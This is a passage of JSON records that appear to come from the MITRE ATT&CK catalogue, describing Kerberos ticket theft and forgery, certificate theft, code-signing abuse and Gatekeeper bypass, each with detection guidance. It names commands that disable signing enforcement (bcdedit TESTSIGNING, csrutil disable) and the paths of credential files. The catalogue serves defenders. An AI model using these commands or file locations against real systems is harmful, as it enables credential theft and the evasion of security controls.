Evilginx 2 July 2018)"}
{"ID":"T1649","name":"Steal or Forge Authentication Certificates","description":"Adversaries may steal or forge certificates used for authentication to access remote systems or resources. Digital certificates are often used to sign and encrypt messages and/or files. Certificates are also used as authentication material. For example, Azure AD device certificates and Active Directory Certificate Services (AD CS) certificates bind to an identity and can be used as credentials for domain accounts.(Citation: O365 Blog Azure AD Device IDs)(Citation: Microsoft AD CS Overview)\n\nAuthentication certificates can be both stolen and forged. For example, AD CS certificates can be stolen from encrypted storage (in the Registry or files)(Citation: APT29 Deep Look at Credential Roaming), misplaced certificate files (i.e. [Unsecured Credentials](https://attack.mitre.org/techniques/T1552)), or directly from the Windows certificate store via various crypto APIs.(Citation: SpecterOps Certified Pre Owned)(Citation: GitHub CertStealer)(Citation: GitHub GhostPack Certificates) With appropriate enrollment rights, users and/or machines within a domain can also request and/or manually renew certificates from enterprise certificate authorities (CA). This enrollment process defines various settings and permissions associated with the certificate. Of note, the certificate’s extended key usage (EKU) values define signing, encryption, and authentication use cases, while the certificate’s subject alternative name (SAN) values define the certificate owner’s alternate names.(Citation: Medium Certified Pre Owned)\n\nAbusing certificates for authentication credentials may enable other behaviors such as [Lateral Movement](https://attack.mitre.org/tactics/TA0008). Certificate-related misconfigurations may also enable opportunities for [Privilege Escalation](https://attack.mitre.org/tactics/TA0004), by way of allowing users to impersonate or assume privileged accounts or permissions via the identities (SANs) associated with a certificate. These abuses may also enable [Persistence](https://attack.mitre.org/tactics/TA0003) via stealing or forging certificates that can be used as [Valid Accounts](https://attack.mitre.org/techniques/T1078) for the duration of the certificate's validity, despite user password resets. Authentication certificates can also be stolen and forged for machine accounts.\n\nAdversaries who have access to root (or subordinate) CA certificate private keys (or mechanisms protecting/managing these keys) may also establish [Persistence](https://attack.mitre.org/tactics/TA0003) by forging arbitrary authentication certificates for the victim domain (known as “golden” certificates).(Citation: Medium Certified Pre Owned) Adversaries may also target certificates and related services in order to access other forms of credentials, such as [Golden Ticket](https://attack.mitre.org/techniques/T1558/001) ticket-granting tickets (TGT) or NTLM plaintext.(Citation: Medium Certified Pre Owned)","url":"https://attack.mitre.org/techniques/T1649","created":"03 August 2022","last modified":"02 March 2023","version":"1.1","tactics":"Credential Access","detection":null,"platforms":"Azure AD, Linux, Windows, macOS","data sources":"Active Directory: Active Directory Credential Request, Active Directory: Active Directory Object Modification, Application Log: Application Log Content, Command: Command Execution, File: File Access, Logon Session: Logon Session Creation, Windows Registry: Windows Registry Key Access","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Lee Christensen, SpecterOps; Thirumalai Natarajan, Mandiant; Tristan Bennett, Seamless Intelligence","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Adsecurity Mimikatz Guide),(Citation: Mandiant APT29 Trello),(Citation: AADInternals Documentation),(Citation: GitHub PSPKIAudit),(Citation: GitHub Certify),(Citation: SpecterOps Certified Pre Owned)"}
{"ID":"T1558","name":"Steal or Forge Kerberos Tickets","description":"Adversaries may attempt to subvert Kerberos authentication by stealing or forging Kerberos tickets to enable [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003). Kerberos is an authentication protocol widely used in modern Windows domain environments. In Kerberos environments, referred to as “realms”, there are three basic participants: client, service, and Key Distribution Center (KDC).(Citation: ADSecurity Kerberos Ring Decoder) Clients request access to a service and through the exchange of Kerberos tickets, originating from KDC, they are granted access after having successfully authenticated. The KDC is responsible for both authentication and ticket granting.  Adversaries may attempt to abuse Kerberos by stealing tickets or forging tickets to enable unauthorized access.\n\nOn Windows, the built-in <code>klist</code> utility can be used to list and analyze cached Kerberos tickets.(Citation: Microsoft Klist)\n\nLinux systems on Active Directory domains store Kerberos credentials locally in the credential cache file referred to as the \"ccache\". The credentials are stored in the ccache file while they remain valid and generally while a user's session lasts.(Citation: MIT ccache) On modern Redhat Enterprise Linux systems, and derivative distributions, the System Security Services Daemon (SSSD) handles Kerberos tickets. By default SSSD maintains a copy of the ticket database that can be found in <code>/var/lib/sss/secrets/secrets.ldb</code> as well as the corresponding key located in <code>/var/lib/sss/secrets/.secrets.mkey</code>. Both files require root access to read. If an adversary is able to access the database and key, the credential cache Kerberos blob can be extracted and converted into a usable Kerberos ccache file that adversaries may use for [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003). The ccache file may also be converted into a Windows format using tools such as Kekeo.(Citation: Linux Kerberos Tickets)(Citation: Brining MimiKatz to Unix)(Citation: Kekeo)\n\n\nKerberos tickets on macOS are stored in a standard ccache format, similar to Linux. By default, access to these ccache entries is federated through the KCM daemon process via the Mach RPC protocol, which uses the caller's environment to determine access. The storage location for these ccache entries is influenced by the <code>/etc/krb5.conf</code> configuration file and the <code>KRB5CCNAME</code> environment variable which can specify to save them to disk or keep them protected via the KCM daemon. Users can interact with ticket storage using <code>kinit</code>, <code>klist</code>, <code>ktutil</code>, and <code>kcc</code> built-in binaries or via Apple's native Kerberos framework. Adversaries can use open source tools to interact with the ccache files directly or to use the Kerberos framework to call lower-level APIs for extracting the user's TGT or Service Tickets.(Citation: SpectorOps Bifrost Kerberos macOS 2019)(Citation: macOS kerberos framework MIT)\n","url":"https://attack.mitre.org/techniques/T1558","created":"11 February 2020","last modified":"30 March 2023","version":"1.4","tactics":"Credential Access","detection":"Monitor for anomalous Kerberos activity, such as malformed or blank fields in Windows logon/logoff events (Event ID 4624, 4672, 4634), RC4 encryption within ticket granting tickets (TGTs), and ticket granting service (TGS) requests without preceding TGT requests.(Citation: ADSecurity Detecting Forged Tickets)(Citation: Stealthbits Detect PtT 2019)(Citation: CERT-EU Golden Ticket Protection)\n\nMonitor the lifetime of TGT tickets for values that differ from the default domain duration.(Citation: Microsoft Kerberos Golden Ticket)\n\nMonitor for indications of [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003) being used to move laterally. \n\nEnable Audit Kerberos Service Ticket Operations to log Kerberos TGS service ticket requests. Particularly investigate irregular patterns of activity (ex: accounts making numerous requests, Event ID 4769, within a small time frame, especially if they also request RC4 encryption [Type 0x17]).(Citation: Microsoft Detecting Kerberoasting Feb 2018) (Citation: AdSecurity Cracking Kerberos Dec 2015)\n\nMonitor for unexpected processes interacting with lsass.exe.(Citation: Medium Detecting Attempts to Steal Passwords from Memory) Common credential dumpers such as [Mimikatz](https://attack.mitre.org/software/S0002) access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details, including Kerberos tickets, are stored.\n\nMonitor for unusual processes accessing <code>secrets.ldb</code> and <code>.secrets.mkey</code> located in <code>/var/lib/sss/secrets/</code>.","platforms":"Linux, Windows, macOS","data sources":"Active Directory: Active Directory Credential Request, Command: Command Execution, File: File Access, Logon Session: Logon Session Metadata","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Cody Thomas, SpecterOps; Tim (Wadhwa-)Brown","permissions required":"root, User","supports remote":null,"system requirements":"Kerberos authentication enabled","impact type":null,"effective permissions":null,"relationship citations":",(Citation: AdSecurity Cracking Kerberos Dec 2015),(Citation: STIG krbtgt reset)"}
{"ID":"T1558.004","name":"Steal or Forge Kerberos Tickets: AS-REP Roasting","description":"Adversaries may reveal credentials of accounts that have disabled Kerberos preauthentication by [Password Cracking](https://attack.mitre.org/techniques/T1110/002) Kerberos messages.(Citation: Harmj0y Roasting AS-REPs Jan 2017) \n\nPreauthentication offers protection against offline [Password Cracking](https://attack.mitre.org/techniques/T1110/002). When enabled, a user requesting access to a resource initiates communication with the Domain Controller (DC) by sending an Authentication Server Request (AS-REQ) message with a timestamp that is encrypted with the hash of their password. If and only if the DC is able to successfully decrypt the timestamp with the hash of the user’s password, it will then send an Authentication Server Response (AS-REP) message that contains the Ticket Granting Ticket (TGT) to the user. Part of the AS-REP message is signed with the user’s password.(Citation: Microsoft Kerberos Preauth 2014)\n\nFor each account found without preauthentication, an adversary may send an AS-REQ message without the encrypted timestamp and receive an AS-REP message with TGT data which may be encrypted with an insecure algorithm such as RC4. The recovered encrypted data may be vulnerable to offline [Password Cracking](https://attack.mitre.org/techniques/T1110/002) attacks similarly to [Kerberoasting](https://attack.mitre.org/techniques/T1558/003) and expose plaintext credentials. (Citation: Harmj0y Roasting AS-REPs Jan 2017)(Citation: Stealthbits Cracking AS-REP Roasting Jun 2019) \n\nAn account registered to a domain, with or without special privileges, can be abused to list all domain accounts that have preauthentication disabled by utilizing Windows tools like [PowerShell](https://attack.mitre.org/techniques/T1059/001) with an LDAP filter. Alternatively, the adversary may send an AS-REQ message for each user. If the DC responds without errors, the account does not require preauthentication and the AS-REP message will already contain the encrypted data. (Citation: Harmj0y Roasting AS-REPs Jan 2017)(Citation: Stealthbits Cracking AS-REP Roasting Jun 2019)\n\nCracked hashes may enable [Persistence](https://attack.mitre.org/tactics/TA0003), [Privilege Escalation](https://attack.mitre.org/tactics/TA0004), and [Lateral Movement](https://attack.mitre.org/tactics/TA0008) via access to [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation: SANS Attacking Kerberos Nov 2014)","url":"https://attack.mitre.org/techniques/T1558/004","created":"24 August 2020","last modified":"07 June 2021","version":"1.0","tactics":"Credential Access","detection":"Enable Audit Kerberos Service Ticket Operations to log Kerberos TGS service ticket requests. Particularly investigate irregular patterns of activity (ex: accounts making numerous requests, Event ID 4768 and 4769, within a small time frame, especially if they also request RC4 encryption [Type 0x17], pre-authentication not required [Type: 0x0]).(Citation: AdSecurity Cracking Kerberos Dec 2015)(Citation: Microsoft Detecting Kerberoasting Feb 2018)(Citation: Microsoft 4768 TGT 2017)","platforms":"Windows","data sources":"Active Directory: Active Directory Credential Request","is sub-technique":true,"sub-technique of":"T1558","defenses bypassed":null,"contributors":"Dan Nutting, @KerberToast; Jacques Pluviose, @Jacqueswildy_IT; James Dunn, @jamdunnDFW, EY; Swapnil Kumbhar; Yossi Nisani, Cymptom","permissions required":"User","supports remote":null,"system requirements":"Valid domain account","impact type":null,"effective permissions":null,"relationship citations":"(Citation: GitHub Rubeus March 2023),(Citation: DFIR Ryuk 2 Hour Speed Run November 2020),(Citation: DFIR Ryuk's Return October 2020),(Citation: AdSecurity Cracking Kerberos Dec 2015),(Citation: Microsoft Preauthentication Jul 2012),(Citation: Stealthbits Cracking AS-REP Roasting Jun 2019)"}
{"ID":"T1558.001","name":"Steal or Forge Kerberos Tickets: Golden Ticket","description":"Adversaries who have the KRBTGT account password hash may forge Kerberos ticket-granting tickets (TGT), also known as a golden ticket.(Citation: AdSecurity Kerberos GT Aug 2015) Golden tickets enable adversaries to generate authentication material for any account in Active Directory.(Citation: CERT-EU Golden Ticket Protection) \n\nUsing a golden ticket, adversaries are then able to request ticket granting service (TGS) tickets, which enable access to specific resources. Golden tickets require adversaries to interact with the Key Distribution Center (KDC) in order to obtain TGS.(Citation: ADSecurity Detecting Forged Tickets)\n\nThe KDC service runs all on domain controllers that are part of an Active Directory domain. KRBTGT is the Kerberos Key Distribution Center (KDC) service account and is responsible for encrypting and signing all Kerberos tickets.(Citation: ADSecurity Kerberos and KRBTGT) The KRBTGT password hash may be obtained using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) and privileged access to a domain controller.","url":"https://attack.mitre.org/techniques/T1558/001","created":"11 February 2020","last modified":"05 November 2020","version":"1.1","tactics":"Credential Access","detection":"Monitor for anomalous Kerberos activity, such as malformed or blank fields in Windows logon/logoff events (Event ID 4624, 4672, 4634), RC4 encryption within TGTs, and TGS requests without preceding TGT requests.(Citation: ADSecurity Kerberos and KRBTGT)(Citation: CERT-EU Golden Ticket Protection)(Citation: Stealthbits Detect PtT 2019)\n\nMonitor the lifetime of TGT tickets for values that differ from the default domain duration.(Citation: Microsoft Kerberos Golden Ticket)\n\nMonitor for indications of [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003) being used to move laterally. \n","platforms":"Windows","data sources":"Active Directory: Active Directory Credential Request, Logon Session: Logon Session Metadata","is sub-technique":true,"sub-technique of":"T1558","defenses bypassed":null,"contributors":"Itamar Mizrahi, Cymptom","permissions required":"User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Github PowerShell Empire),(Citation: NCC Group APT15 Alive and Strong),(Citation: GitHub Rubeus March 2023),(Citation: GitHub Mimikatz kerberos Module),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: STIG krbtgt reset)"}
{"ID":"T1558.003","name":"Steal or Forge Kerberos Tickets: Kerberoasting","description":"Adversaries may abuse a valid Kerberos ticket-granting ticket (TGT) or sniff network traffic to obtain a ticket-granting service (TGS) ticket that may be vulnerable to [Brute Force](https://attack.mitre.org/techniques/T1110).(Citation: Empire InvokeKerberoast Oct 2016)(Citation: AdSecurity Cracking Kerberos Dec 2015) \n\nService principal names (SPNs) are used to uniquely identify each instance of a Windows service. To enable authentication, Kerberos requires that SPNs be associated with at least one service logon account (an account specifically tasked with running a service(Citation: Microsoft Detecting Kerberoasting Feb 2018)).(Citation: Microsoft SPN)(Citation: Microsoft SetSPN)(Citation: SANS Attacking Kerberos Nov 2014)(Citation: Harmj0y Kerberoast Nov 2016)\n\nAdversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request one or more Kerberos ticket-granting service (TGS) service tickets for any SPN from a domain controller (DC).(Citation: Empire InvokeKerberoast Oct 2016)(Citation: AdSecurity Cracking Kerberos Dec 2015) Portions of these tickets may be encrypted with the RC4 algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the service account associated with the SPN is used as the private key and is thus vulnerable to offline [Brute Force](https://attack.mitre.org/techniques/T1110) attacks that may expose plaintext credentials.(Citation: AdSecurity Cracking Kerberos Dec 2015)(Citation: Empire InvokeKerberoast Oct 2016) (Citation: Harmj0y Kerberoast Nov 2016)\n\nThis same behavior could be executed using service tickets captured from network traffic.(Citation: AdSecurity Cracking Kerberos Dec 2015)\n\nCracked hashes may enable [Persistence](https://attack.mitre.org/tactics/TA0003), [Privilege Escalation](https://attack.mitre.org/tactics/TA0004), and [Lateral Movement](https://attack.mitre.org/tactics/TA0008) via access to [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation: SANS Attacking Kerberos Nov 2014)","url":"https://attack.mitre.org/techniques/T1558/003","created":"11 February 2020","last modified":"30 March 2023","version":"1.2","tactics":"Credential Access","detection":"Enable Audit Kerberos Service Ticket Operations to log Kerberos TGS service ticket requests. Particularly investigate irregular patterns of activity (ex: accounts making numerous requests, Event ID 4769, within a small time frame, especially if they also request RC4 encryption [Type 0x17]).(Citation: Microsoft Detecting Kerberoasting Feb 2018)(Citation: AdSecurity Cracking Kerberos Dec 2015)","platforms":"Windows","data sources":"Active Directory: Active Directory Credential Request","is sub-technique":true,"sub-technique of":"T1558","defenses bypassed":null,"contributors":"Praetorian","permissions required":null,"supports remote":null,"system requirements":"Valid domain account or the ability to sniff traffic within a domain","impact type":null,"effective permissions":null,"relationship citations":"(Citation: CrowdStrike Carbon Spider August 2021),(Citation: DHS/CISA Ransomware Targeting Healthcare October 2020),(Citation: FireEye KEGTAP SINGLEMALT October 2020),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: Impacket Tools),(Citation: Github PowerShell Empire),(Citation: Harmj0y Kerberoast Nov 2016),(Citation: DFIR Ryuk 2 Hour Speed Run November 2020),(Citation: PowerSploit Invoke Kerberoast),(Citation: Microsoft Deep Dive Solorigate January 2021),(Citation: Palo Alto Brute Ratel July 2022),(Citation: GitHub Rubeus March 2023),(Citation: FoxIT Wocao December 2019),(Citation: DFIR Ryuk's Return October 2020),(Citation: AdSecurity Cracking Kerberos Dec 2015)"}
{"ID":"T1558.002","name":"Steal or Forge Kerberos Tickets: Silver Ticket","description":"Adversaries who have the password hash of a target service account (e.g. SharePoint, MSSQL) may forge Kerberos ticket granting service (TGS) tickets, also known as silver tickets. Kerberos TGS tickets are also known as service tickets.(Citation: ADSecurity Silver Tickets)\n\nSilver tickets are more limited in scope in than golden tickets in that they only enable adversaries to access a particular resource (e.g. MSSQL) and the system that hosts the resource; however, unlike golden tickets, adversaries with the ability to forge silver tickets are able to create TGS tickets without interacting with the Key Distribution Center (KDC), potentially making detection more difficult.(Citation: ADSecurity Detecting Forged Tickets)\n\nPassword hashes for target services may be obtained using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) or [Kerberoasting](https://attack.mitre.org/techniques/T1558/003).","url":"https://attack.mitre.org/techniques/T1558/002","created":"11 February 2020","last modified":"25 March 2020","version":"1.0","tactics":"Credential Access","detection":"Monitor for anomalous Kerberos activity, such as malformed or blank fields in Windows logon/logoff events (Event ID 4624, 4634, 4672).(Citation: ADSecurity Detecting Forged Tickets) \n\nMonitor for unexpected processes interacting with lsass.exe.(Citation: Medium Detecting Attempts to Steal Passwords from Memory) Common credential dumpers such as Mimikatz access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details, including Kerberos tickets, are stored.","platforms":"Windows","data sources":"Logon Session: Logon Session Metadata","is sub-technique":true,"sub-technique of":"T1558","defenses bypassed":null,"contributors":null,"permissions required":"User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: AADInternals Documentation),(Citation: GitHub Rubeus March 2023),(Citation: Github PowerShell Empire),(Citation: GitHub Mimikatz kerberos Module),(Citation: AdSecurity Cracking Kerberos Dec 2015)"}
{"ID":"T1553","name":"Subvert Trust Controls","description":"Adversaries may undermine security controls that will either warn users of untrusted activity or prevent execution of untrusted programs. Operating systems and security products may contain mechanisms to identify programs or websites as possessing some level of trust. Examples of such features would include a program being allowed to run because it is signed by a valid code signing certificate, a program prompting the user with a warning because it has an attribute set from being downloaded from the Internet, or getting an indication that you are about to connect to an untrusted site.\n\nAdversaries may attempt to subvert these trust mechanisms. The method adversaries use will depend on the specific mechanism they seek to subvert. Adversaries may conduct [File and Directory Permissions Modification](https://attack.mitre.org/techniques/T1222) or [Modify Registry](https://attack.mitre.org/techniques/T1112) in support of subverting these controls.(Citation: SpectorOps Subverting Trust Sept 2017) Adversaries may also create or steal code signing certificates to acquire trust on target systems.(Citation: Securelist Digital Certificates)(Citation: Symantec Digital Certificates) ","url":"https://attack.mitre.org/techniques/T1553","created":"05 February 2020","last modified":"05 May 2022","version":"1.1","tactics":"Defense Evasion","detection":"Collect and analyze signing certificate metadata on software that executes within the environment to look for unusual certificate characteristics and outliers. Periodically baseline registered SIPs and trust providers (Registry entries and files on disk), specifically looking for new, modified, or non-Microsoft entries. (Citation: SpectorOps Subverting Trust Sept 2017) A system's root certificates are unlikely to change frequently. Monitor new certificates installed on a system that could be due to malicious activity.(Citation: SpectorOps Code Signing Dec 2017)\n\nAnalyze Autoruns data for oddities and anomalies, specifically malicious files attempting persistent execution by hiding within auto-starting locations. Autoruns will hide entries signed by Microsoft or Windows by default, so ensure \"Hide Microsoft Entries\" and \"Hide Windows Entries\" are both deselected.(Citation: SpectorOps Subverting Trust Sept 2017) \n\nMonitor and investigate attempts to modify extended file attributes with utilities such as <code>xattr</code>. Built-in system utilities may generate high false positive alerts, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible. ","platforms":"Linux, Windows, macOS","data sources":"Command: Command Execution, File: File Metadata, File: File Modification, Module: Module Load, Process: Process Creation, Windows Registry: Windows Registry Key Creation, Windows Registry: Windows Registry Key Modification","is sub-technique":false,"sub-technique of":null,"defenses bypassed":"Anti-virus, Application Control, Autoruns Analysis, Digital Certificate Validation, User Mode Signature Validation, Windows User Account Control","contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Novetta-Axiom),(Citation: SpectorOps Code Signing Dec 2017),(Citation: Wikipedia HPKP)"}
{"ID":"T1553.002","name":"Subvert Trust Controls: Code Signing","description":"Adversaries may create, acquire, or steal code signing materials to sign their malware or tools. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. (Citation: Wikipedia Code Signing) The certificates used during an operation may be created, acquired, or stolen by the adversary. (Citation: Securelist Digital Certificates) (Citation: Symantec Digital Certificates) Unlike [Invalid Code Signature](https://attack.mitre.org/techniques/T1036/001), this activity will result in a valid signature.\n\nCode signing to verify software on first run can be used on modern Windows and macOS systems. It is not used on Linux due to the decentralized nature of the platform. (Citation: Wikipedia Code Signing)(Citation: EclecticLightChecksonEXECodeSigning)\n\nCode signing certificates may be used to bypass security policies that require signed code to execute on a system. ","url":"https://attack.mitre.org/techniques/T1553/002","created":"05 February 2020","last modified":"22 September 2022","version":"1.1","tactics":"Defense Evasion","detection":"Collect and analyze signing certificate metadata on software that executes within the environment to look for unusual certificate characteristics and outliers.","platforms":"Windows, macOS","data sources":"File: File Metadata","is sub-technique":true,"sub-technique of":"T1553","defenses bypassed":"Windows User Account Control","contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Unit42 Clop April 2021),(Citation: JPCERT ChChes Feb 2017),(Citation: ESET Lazarus Jun 2020),(Citation: ClearSky Wilted Tulip July 2017),(Citation: Wired Lockergoga 2019),(Citation: Volexity Patchwork June 2018),(Citation: DFIR Ryuk 2 Hour Speed Run November 2020),(Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011),(Citation: Securelist APT10 March 2021),(Citation: Medium Metamorfo Apr 2020),(Citation: Palo Alto menuPass Feb 2017),(Citation: ESET PipeMon May 2020),(Citation: FireEye FIN7 Aug 2018),(Citation: Check Point Black Basta October 2022),(Citation: US-CERT BLINDINGCAN Aug 2020),(Citation: Securelist WhiteBear Aug 2017),(Citation: Checkpoint MosesStaff Nov 2021),(Citation: ESET GreyEnergy Oct 2018),(Citation: Deep Instinct TA505 Apr 2019),(Citation: Kaspersky Darkhotel),(Citation: McAfee Honeybee),(Citation: CISA AppleJeus Feb 2021),(Citation: Symantec Tick Apr 2016),(Citation: DFIR Conti Bazar Nov 2021),(Citation: Microsoft GALLIUM December 2019),(Citation: Symantec Suckfly March 2016),(Citation: FireEye FIN7 Oct 2019),(Citation: Cybereason Bazar July 2020),(Citation: ATT QakBot April 2021),(Citation: Cyberreason Anchor December 2019),(Citation: Talos Cobalt Strike September 2020),(Citation: FireEye APT41 Aug 2019),(Citation: ESET Ebury Feb 2014),(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: Deep Instinct Black Basta August 2022),(Citation: FireEye Operation Molerats),(Citation: Kaspersky LuminousMoth July 2021),(Citation: Group IB Silence Aug 2019),(Citation: FireEye APT40 March 2019),(Citation: Trend Micro TA505 June 2019),(Citation: Unit 42 BackConfig May 2020),(Citation: CheckPoint Bandook Nov 2020),(Citation: Symantec Nerex May 2012),(Citation: Lazarus APT January 2022),(Citation: ESET RTM Feb 2017),(Citation: Janicab),(Citation: Cybereason TA505 April 2019),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: Lunghi Iron Tiger Linux),(Citation: ESET Gazer Aug 2017),(Citation: Security Intelligence More Eggs Aug 2019),(Citation: ESET Hermetic Wiper February 2022),(Citation: ThreatConnect Kimsuky September 2020),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: Group IB APT 41 June 2021),(Citation: Kaspersky Turla),(Citation: ClearSky OilRig Jan 2017),(Citation: Bitdefender StrongPity June 2020),(Citation: Kaspersky Winnti April 2013),(Citation: FireEye Periscope March 2018),(Citation: Symantec Ukraine Wipers February 2022),(Citation: Qualys Hermetic Wiper March 2022),(Citation: FireEye CARBANAK June 2017),(Citation: ESET Hermetic Wizard March 2022),(Citation: Secureworks GOLD KINGSWOOD September 2018),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: Cybereason Kimsuky November 2020),(Citation: Crowdstrike DriveSlayer February 2022),(Citation: Securelist Darkhotel Aug 2015),"}
{"ID":"T1553.006","name":"Subvert Trust Controls: Code Signing Policy Modification","description":"Adversaries may modify code signing policies to enable execution of unsigned or self-signed code. Code signing provides a level of authenticity on a program from a developer and a guarantee that the program has not been tampered with. Security controls can include enforcement mechanisms to ensure that only valid, signed code can be run on an operating system. \n\nSome of these security controls may be enabled by default, such as Driver Signature Enforcement (DSE) on Windows or System Integrity Protection (SIP) on macOS.(Citation: Microsoft DSE June 2017)(Citation: Apple Disable SIP) Other such controls may be disabled by default but are configurable through application controls, such as only allowing signed Dynamic-Link Libraries (DLLs) to execute on a system. Since it can be useful for developers to modify default signature enforcement policies during the development and testing of applications, disabling of these features may be possible with elevated permissions.(Citation: Microsoft Unsigned Driver Apr 2017)(Citation: Apple Disable SIP)\n\nAdversaries may modify code signing policies in a number of ways, including through use of command-line or GUI utilities, [Modify Registry](https://attack.mitre.org/techniques/T1112), rebooting the computer in a debug/recovery mode, or by altering the value of variables in kernel memory.(Citation: Microsoft TESTSIGNING Feb 2021)(Citation: Apple Disable SIP)(Citation: FireEye HIKIT Rootkit Part 2)(Citation: GitHub Turla Driver Loader) Examples of commands that can modify the code signing policy of a system include <code>bcdedit.exe -set TESTSIGNING ON</code> on Windows and <code>csrutil disable</code> on macOS.(Citation: Microsoft TESTSIGNING Feb 2021)(Citation: Apple Disable SIP) Depending on the implementation, successful modification of a signing policy may require reboot of the compromised system. Additionally, some implementations can introduce visible artifacts for the user (ex: a watermark in the corner of the screen stating the system is in Test Mode). Adversaries may attempt to remove such artifacts.(Citation: F-Secure BlackEnergy 2014)\n\nTo gain access to kernel memory to modify variables related to signature checks, such as modifying <code>g_CiOptions</code> to disable Driver Signature Enforcement, adversaries may conduct [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) using a signed, but vulnerable driver.(Citation: Unit42 AcidBox June 2020)(Citation: GitHub Turla Driver Loader)","url":"https://attack.mitre.org/techniques/T1553/006","created":"23 April 2021","last modified":"05 May 2022","version":"1.0","tactics":"Defense Evasion","detection":"Monitor processes and command-line arguments for actions that could be taken to modify the code signing policy of a system, such as <code>bcdedit.exe -set TESTSIGNING ON</code>.(Citation: Microsoft TESTSIGNING Feb 2021) Consider monitoring for modifications made to Registry keys associated with code signing policies, such as <code>HKCU\\Software\\Policies\\Microsoft\\Windows NT\\Driver Signing</code>. Modifications to the code signing policy of a system are likely to be rare.","platforms":"Windows, macOS","data sources":"Command: Command Execution, Process: Process Creation, Windows Registry: Windows Registry Key Modification","is sub-technique":true,"sub-technique of":"T1553","defenses bypassed":"Application Control, Digital Certificate Validation, User Mode Signature Validation","contributors":"Abel Morales, Exabeam","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: FBI FLASH APT39 September 2020),(Citation: F-Secure BlackEnergy 2014),(Citation: Unit42 AcidBox June 2020),(Citation: GitHub Turla Driver Loader),(Citation: Trend Micro Iron Tiger April 2021),(Citation: FireEye HIKIT Rootkit Part 2),(Citation: Microsoft TESTSIGNING Feb 2021)"}
{"ID":"T1553.001","name":"Subvert Trust Controls: Gatekeeper Bypass","description":"Adversaries may modify file attributes and subvert Gatekeeper functionality to evade user prompts and execute untrusted programs. Gatekeeper is a set of technologies that act as layer of Apple’s security model to ensure only trusted applications are executed on a host. Gatekeeper was built on top of File Quarantine in Snow Leopard (10.6, 2009) and has grown to include Code Signing, security policy compliance, Notarization, and more. Gatekeeper also treats applications running for the first time differently than reopened applications.(Citation: TheEclecticLightCompany Quarantine and the flag)(Citation: TheEclecticLightCompany apple notarization )\n\nBased on an opt-in system, when files are downloaded an extended attribute (xattr) called `com.apple.quarantine` (also known as a quarantine flag) can be set on the file by the application performing the download. Launch Services opens the application in a suspended state. For first run applications with the quarantine flag set, Gatekeeper executes the following functions:\n\n1. Checks extended attribute – Gatekeeper checks for the quarantine flag, then provides an alert prompt to the user to allow or deny execution.(Citation: OceanLotus for OS X)(Citation: 20 macOS Common Tools and Techniques)\n\n2. Checks System Policies - Gatekeeper checks the system security policy, allowing execution of apps downloaded from either just the App Store or the App Store and identified developers.\n\n3. Code Signing – Gatekeeper checks for a valid code signature from an Apple Developer ID.\n\n4. Notarization - Using the `api.apple-cloudkit.com` API, Gatekeeper reaches out to Apple servers to verify or pull down the notarization ticket and ensure the ticket is not revoked. Users can override notarization, which will result in a prompt of executing an “unauthorized app” and the security policy will be modified.\n\nAdversaries can subvert one or multiple security controls within Gatekeeper checks through logic errors (e.g. [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211)), unchecked file types, and external libraries. For example, prior to macOS 13 Ventura, code signing and notarization checks were only conducted on first launch, allowing adversaries to write malicious executables to previously opened applications in order to bypass Gatekeeper security checks.(Citation: theevilbit gatekeeper bypass 2021)(Citation: Application Bundle Manipulation Brandon Dalton)\n\nApplications and files loaded onto the system from a USB flash drive, optical disk, external hard drive, from a drive shared over the local network, or using the curl command may not set the quarantine flag. Additionally, it is possible to avoid setting the quarantine flag using [Drive-by Compromise](https://attack.mitre.org/techniques/T1189).","url":"https://attack.mitre.org/techniques/T1553/001","created":"05 February 2020","last modified":"21 October 2022","version":"1.2","tactics":"Defense Evasion","detection":"The removal of the <code>com.apple.quarantine</code> flag by a user instead of the operating system is a suspicious action and should be examined further. Monitor and investigate attempts to modify extended file attributes with utilities such as <code>xattr</code>. Built-in system utilities may generate high false positive alerts, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible. Monitor software update frameworks that strip the <code>com.apple.quarantine</code> flag when performing updates. \n\nReview <code>false</code> values under the <code>LSFileQuarantineEnabled</code> entry in an application's <code>Info.plist</code> file (required by every application). <code>false</code> under <code>LSFileQuarantineEnabled</code> indicates that an application does not use the quarantine flag. Unsandboxed applications with an unspecified <code>LSFileQuarantineEnabled</code> entry will default to not setting the quarantine flag. \n\nQuarantineEvents is a SQLite database containing a list of all files assigned the <code>com.apple.quarantine</code> attribute, located at 